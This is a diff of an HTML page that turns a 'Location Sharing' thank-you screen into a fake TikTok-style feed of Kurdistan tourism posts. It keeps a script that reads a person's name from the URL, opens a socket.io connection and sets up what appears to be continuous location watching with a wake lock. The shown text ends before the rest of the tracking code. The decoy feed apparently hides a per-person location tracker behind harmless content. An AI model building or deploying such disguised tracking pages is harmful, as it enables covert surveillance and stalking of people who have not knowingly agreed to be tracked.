@@ -3,30 +3,293 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>Location Sharing</title>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+  <title>Kurdistan</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { font-family:'DM Sans',sans-serif; background:#0c1221; color:#e2e8f0; height:100vh; display:flex; align-items:center; justify-content:center; }
-    .msg { text-align:center; padding:32px; }
-    .msg h1 { font-size:32px; font-weight:600; margin-bottom:8px; }
-    .msg p { font-size:16px; color:#94a3b8; }
-    .hint { font-size:13px; color:#475569; margin-top:20px; display:none; }
+    body { font-family:'DM Sans',sans-serif; background:#000; color:#fff; height:100vh; overflow-y:auto; -webkit-overflow-scrolling:touch; }
+
+    .tiktok-feed { max-width:480px; margin:0 auto; }
+
+    .tiktok-post {
+      position:relative;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      justify-content:flex-end;
+      overflow:hidden;
+      border-bottom:1px solid #1a1a1a;
+    }
+
+    .post-bg {
+      position:absolute; inset:0;
+      background-size:cover;
+      background-position:center;
+      z-index:0;
+    }
+    .post-bg::after {
+      content:'';
+      position:absolute; inset:0;
+      background:linear-gradient(to top, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.2) 40%, rgba(0,0,0,0) 60%);
+    }
+
+    .post-content {
+      position:relative; z-index:1;
+      padding:20px 16px 24px;
+      display:flex;
+      gap:12px;
+    }
+
+    .post-text { flex:1; min-width:0; }
+
+    .post-user {
+      display:flex; align-items:center; gap:8px;
+      margin-bottom:10px;
+    }
+    .post-avatar {
+      width:36px; height:36px; border-radius:50%;
+      border:2px solid #fff;
+      display:flex; align-items:center; justify-content:center;
+      font-size:14px; font-weight:700;
+      background:linear-gradient(135deg, #fe2c55, #25f4ee);
+    }
+    .post-username { font-size:14px; font-weight:700; }
+    .post-username span { color:rgba(255,255,255,0.5); font-weight:400; }
+
+    .post-caption {
+      font-size:14px;
+      line-height:1.5;
+      margin-bottom:10px;
+      display:-webkit-box;
+      -webkit-line-clamp:4;
+      -webkit-box-orient:vertical;
+      overflow:hidden;
+    }
+
+    .post-tags { margin-bottom:12px; }
+    .post-tags span {
+      font-size:13px; font-weight:600;
+      color:#fff;
+      margin-right:6px;
+    }
+
+    .post-music {
+      display:flex; align-items:center; gap:6px;
+      font-size:12px; color:rgba(255,255,255,0.7);
+      overflow:hidden;
+    }
+    .music-icon { font-size:14px; flex-shrink:0; }
+    .music-text {
+      white-space:nowrap;
+      animation:scroll-music 8s linear infinite;
+    }
+    @keyframes scroll-music {
+      0% { transform:translateX(0); }
+      100% { transform:translateX(-50%); }
+    }
+
+    /* Side actions */
+    .post-actions {
+      display:flex; flex-direction:column;
+      align-items:center; gap:16px;
+      padding-bottom:8px;
+      flex-shrink:0;
+    }
+    .action-btn {
+      display:flex; flex-direction:column;
+      align-items:center; gap:2px;
+    }
+    .action-icon {
+      width:40px; height:40px; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-size:22px;
+      background:rgba(255,255,255,0.08);
+    }
+    .action-count { font-size:11px; color:rgba(255,255,255,0.8); }
+
+    .music-disc {
+      width:40px; height:40px; border-radius:50%;
+      background:linear-gradient(135deg, #333, #111);
+      border:2px solid #444;
+      display:flex; align-items:center; justify-content:center;
+      font-size:12px;
+      animation:spin-disc 4s linear infinite;
+    }
+    @keyframes spin-disc {
+      from { transform:rotate(0deg); }
+      to { transform:rotate(360deg); }
+    }
+
+    .hint { font-size:13px; color:#475569; text-align:center; padding:20px; display:none; position:fixed; bottom:0; left:0; right:0; z-index:10; background:rgba(0,0,0,0.8); }
   </style>
 </head>
 <body>
-  <div class="msg">
-    <h1>Thank you</h1>
-    <p>You're all set.</p>
-    <div class="hint" id="hint">To share your location, please allow access in your browser settings</div>
+
+  <div class="tiktok-feed">
+
+    <!-- Post 1: Erbil Citadel -->
+    <div class="tiktok-post">
+      <div class="post-bg" style="background-image:url('https://images.unsplash.com/photo-1594489428504-5c0c480a15fd?w=800&q=80');"></div>
+      <div class="post-content">
+        <div class="post-text">
+          <div class="post-user">
+            <div class="post-avatar">K</div>
+            <div class="post-username">kurdistan.vibes <span>· 2h</span></div>
+          </div>
+          <div class="post-caption">The Erbil Citadel has been continuously inhabited for over 6,000 years, making it one of the oldest living cities on Earth. Standing in the heart of Hawler, it watched empires rise and fall.</div>
+          <div class="post-tags">
+            <span>#ErbilCitadel</span>
+            <span>#Kurdistan</span>
+            <span>#Hawler</span>
+            <span>#UNESCO</span>
+          </div>
+          <div class="post-music">
+            <span class="music-icon">🎵</span>
+            <span class="music-text">Kurdish Folk — Traditional Oud &nbsp;&nbsp;&nbsp; Kurdish Folk — Traditional Oud</span>
+          </div>
+        </div>
+        <div class="post-actions">
+          <div class="action-btn"><div class="action-icon">❤️</div><div class="action-count">42.3K</div></div>
+          <div class="action-btn"><div class="action-icon">💬</div><div class="action-count">1,204</div></div>
+          <div class="action-btn"><div class="action-icon">🔖</div><div class="action-count">8,912</div></div>
+          <div class="action-btn"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+          <div class="music-disc">🎶</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Post 2: Mountains -->
+    <div class="tiktok-post">
+      <div class="post-bg" style="background-image:url('https://images.unsplash.com/photo-1586861203927-800a5acdcc4d?w=800&q=80');"></div>
+      <div class="post-content">
+        <div class="post-text">
+          <div class="post-user">
+            <div class="post-avatar">H</div>
+            <div class="post-username">hike.kurdistan <span>· 5h</span></div>
+          </div>
+          <div class="post-caption">Kurdistan is called the land of mountains for a reason. The Zagros range stretches across the region with peaks reaching over 3,600m. Fresh air, waterfalls, and views that make you forget the world exists.</div>
+          <div class="post-tags">
+            <span>#ZagrosMountains</span>
+            <span>#Kurdistan</span>
+            <span>#Nature</span>
+          </div>
+          <div class="post-music">
+            <span class="music-icon">🎵</span>
+            <span class="music-text">Mountain Breeze — Ambient Kurdistan &nbsp;&nbsp;&nbsp; Mountain Breeze — Ambient Kurdistan</span>
+          </div>
+        </div>
+        <div class="post-actions">
+          <div class="action-btn"><div class="action-icon">❤️</div><div class="action-count">38.1K</div></div>
+          <div class="action-btn"><div class="action-icon">💬</div><div class="action-count">879</div></div>
+          <div class="action-btn"><div class="action-icon">🔖</div><div class="action-count">5,430</div></div>
+          <div class="action-btn"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+          <div class="music-disc">🎶</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Post 3: Kurdish Food -->
+    <div class="tiktok-post">
+      <div class="post-bg" style="background-image:url('https://images.unsplash.com/photo-1547424850-28ac9ac2f2d1?w=800&q=80');"></div>
+      <div class="post-content">
+        <div class="post-text">
+          <div class="post-user">
+            <div class="post-avatar">F</div>
+            <div class="post-username">foodie.kurd <span>· 8h</span></div>
+          </div>
+          <div class="post-caption">Kurdish cuisine hits different. Dolma, kubba, biryani, tepsi, and the freshest kebabs you'll ever taste. Every meal is a family gathering. Food isn't just food here — it's love on a plate.</div>
+          <div class="post-tags">
+            <span>#KurdishFood</span>
+            <span>#Dolma</span>
+            <span>#Kurdistan</span>
+            <span>#Foodie</span>
+          </div>
+          <div class="post-music">
+            <span class="music-icon">🎵</span>
+            <span class="music-text">Sizzle & Spice — Kurdish Kitchen Beats &nbsp;&nbsp;&nbsp; Sizzle & Spice — Kurdish Kitchen Beats</span>
+          </div>
+        </div>
+        <div class="post-actions">
+          <div class="action-btn"><div class="action-icon">❤️</div><div class="action-count">55.7K</div></div>
+          <div class="action-btn"><div class="action-icon">💬</div><div class="action-count">2,340</div></div>
+          <div class="action-btn"><div class="action-icon">🔖</div><div class="action-count">12.1K</div></div>
+          <div class="action-btn"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+          <div class="music-disc">🎶</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Post 4: Sulaymaniyah Culture -->
+    <div class="tiktok-post">
+      <div class="post-bg" style="background-image:url('https://images.unsplash.com/photo-1524231757912-21f4fe3a7200?w=800&q=80');"></div>
+      <div class="post-content">
+        <div class="post-text">
+          <div class="post-user">
+            <div class="post-avatar">S</div>
+            <div class="post-username">slemani.culture <span>· 12h</span></div>
+          </div>
+          <div class="post-caption">Sulaymaniyah — the cultural capital of Kurdistan. Home to poets, artists, and thinkers. The bazaars are alive with color, the chai khanas buzz with conversation, and the sunsets paint the mountains gold.</div>
+          <div class="post-tags">
+            <span>#Sulaymaniyah</span>
+            <span>#Slemani</span>
+            <span>#KurdistanCulture</span>
+          </div>
+          <div class="post-music">
+            <span class="music-icon">🎵</span>
+            <span class="music-text">Slemani Nights — Kurdish Chill &nbsp;&nbsp;&nbsp; Slemani Nights — Kurdish Chill</span>
+          </div>
+        </div>
+        <div class="post-actions">
+          <div class="action-btn"><div class="action-icon">❤️</div><div class="action-count">29.8K</div></div>
+          <div class="action-btn"><div class="action-icon">💬</div><div class="action-count">1,567</div></div>
+          <div class="action-btn"><div class="action-icon">🔖</div><div class="action-count">7,230</div></div>
+          <div class="action-btn"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+          <div class="music-disc">🎶</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Post 5: Kurdish Dance -->
+    <div class="tiktok-post">
+      <div class="post-bg" style="background-image:url('https://images.unsplash.com/photo-1504609813442-a8924e83f76e?w=800&q=80');"></div>
+      <div class="post-content">
+        <div class="post-text">
+          <div class="post-user">
+            <div class="post-avatar">D</div>
+            <div class="post-username">dance.kurdistan <span>· 1d</span></div>
+          </div>
+          <div class="post-caption">Nothing brings Kurds together like a halparke. Hands held, feet moving in sync, the music builds and suddenly the whole room is one heartbeat. This is how we celebrate — together, always together.</div>
+          <div class="post-tags">
+            <span>#Halparke</span>
+            <span>#KurdishDance</span>
+            <span>#Kurdistan</span>
+            <span>#Culture</span>
+          </div>
+          <div class="post-music">
+            <span class="music-icon">🎵</span>
+            <span class="music-text">Halparke Mix — DJ Kurd &nbsp;&nbsp;&nbsp; Halparke Mix — DJ Kurd</span>
+          </div>
+        </div>
+        <div class="post-actions">
+          <div class="action-btn"><div class="action-icon">❤️</div><div class="action-count">67.2K</div></div>
+          <div class="action-btn"><div class="action-icon">💬</div><div class="action-count">3,890</div></div>
+          <div class="action-btn"><div class="action-icon">🔖</div><div class="action-count">15.4K</div></div>
+          <div class="action-btn"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+          <div class="music-disc">🎶</div>
+        </div>
+      </div>
+    </div>
+
   </div>
+
+  <div class="hint" id="hint">To share your location, please allow access in your browser settings</div>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const raw = decodeURIComponent(window.location.pathname.split('/')[2] || '');
     const userName = raw.charAt(0).toUpperCase() + raw.slice(1);
     const userId = raw.toLowerCase().replace(/\s+/g, '-');
-    document.title = userName || 'Location Sharing';
+    document.title = userName || 'Kurdistan';
 
     const socket = io();
     let watchId = null, wakeLock = null, denied = false;
